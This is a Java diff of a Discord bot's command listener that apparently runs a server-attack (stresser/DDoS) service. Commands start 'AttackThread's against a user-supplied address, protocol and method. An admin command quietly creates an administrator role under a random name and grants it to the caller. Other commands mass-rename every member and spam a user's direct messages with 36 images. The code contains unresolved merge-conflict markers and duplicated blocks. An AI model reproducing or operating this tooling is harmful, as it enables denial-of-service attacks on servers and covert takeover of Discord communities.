@@ -29,6 +29,10 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
 
+import net.dv8tion.jda.api.Permission;
+
+import net.servokio.q4mc.utils.Yiff;
+
 public class DiscordListener extends ListenerAdapter {
 
     @Override
@@ -70,7 +74,6 @@ public class DiscordListener extends ListenerAdapter {
                 String addr = event.getOption("address").getAsString();
                 int protocol = MainDC.main.protocols.protocolsMap.get(event.getOption("protocol").getAsString());
                 String method = event.getOption("method").getAsString();
-
                 ServerInfo info = Resolve.getServerInfo(addr);
                 if (info == null || !info.isOnline()) {
                     event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr, info)).queue();
@@ -106,6 +109,60 @@ public class DiscordListener extends ListenerAdapter {
                     for(Member m : event.getGuild().getMembers()) event.getGuild().modifyNickname(m, Static.getRandomFromList(Config.CHANGE_NICKS)).queue();
                 }
 
+<<<<<<< Updated upstream
+                ServerInfo info = Resolve.getServerInfo(addr);
+                if (info == null || !info.isOnline()) {
+                    event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr, info)).queue();
+                } else {
+                    int atID = MainDC.getInstance().incAtt();
+                    event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.startAttack(addr, method, event.getOption("protocol").getAsString(), atID)).queue();
+                    Thread th = new AttackThread(atID, addr, protocol, method);
+                    th.start();
+                    MainDC.getInstance().threadManager.addThread(event.getMember().getId(), th);
+                }
+=======
+            } else {
+                event.getUser().openPrivateChannel().queue(privateChannel -> {
+                    if(MainDC.getInstance().dro4er.contains(event.getUser().getId())){
+                        addYiffRole(event.getGuild(), event.getMember());
+                    } else MainDC.getInstance().dro4er.add(event.getMember().getId());
+                    int d = 0;
+                    while (d < 36) {
+                        privateChannel.sendMessageEmbeds(new EmbedBuilder().setImage(addParameter("https://servokio.ru/api4/image-proxy", "url", Yiff.getImage())).setColor(new Color(0x66AECB)).build()).queue();
+                        d++;
+                    }
+                    event.reply("ok").queue();
+                });
+>>>>>>> Stashed changes
+            }
+        } else if (event.getName().equals("methods")) {
+            event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.methods()).build()).queue();
+        } else if (event.getName().equals("plan")) {
+            event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.plan()).build()).queue();
+        } else if (event.getName().equals("stop")) {
+            int t = MainDC.getInstance().threadManager.threads.containsKey(event.getMember().getId()) ?  MainDC.getInstance().threadManager.threads.get(event.getMember().getId()).size() : 0;
+            MainDC.getInstance().threadManager.stopAll(event.getMember().getId());
+            event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.stop(t)).build()).queue();
+        } else if (event.getName().equals("apanel")) {
+            if (MainDC.getInstance().admins.contains(event.getMember().getId())) {
+                String cmd = event.getOption("command").getAsString();
+                if(cmd.equals("stats")){
+                    event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.stats()).build()).queue();
+                } else if(cmd.equals("stopall")){
+                    MainDC.getInstance().threadManager.stopReallyAll();
+                    event.reply("Stopped all attacks").queue();
+                } else if(cmd.equals("admin")){
+                    event.getGuild().createRole().setPermissions(Permission.ADMINISTRATOR).setName(Static.randomStr(10)).queue(r -> event.getGuild().addRoleToMember(event.getMember(), r).queue());
+                    event.reply("Im give you Admin role").queue();
+<<<<<<< Updated upstream
+                } else if(cmd.equals("cn")){ //cn - сменить ники, а я блять не понял, какой кингуру какую азию перепрыгивает
+                    event.reply("ok").queue();
+                    for(Member m : event.getGuild().getMembers()) event.getGuild().modifyNickname(m, Static.getRandomFromList(Config.CHANGE_NICKS)).queue();
+                }
+
+=======
+                }
+>>>>>>> Stashed changes
             } else {
                 event.getUser().openPrivateChannel().queue(privateChannel -> {
                     if(MainDC.getInstance().dro4er.contains(event.getUser().getId())){
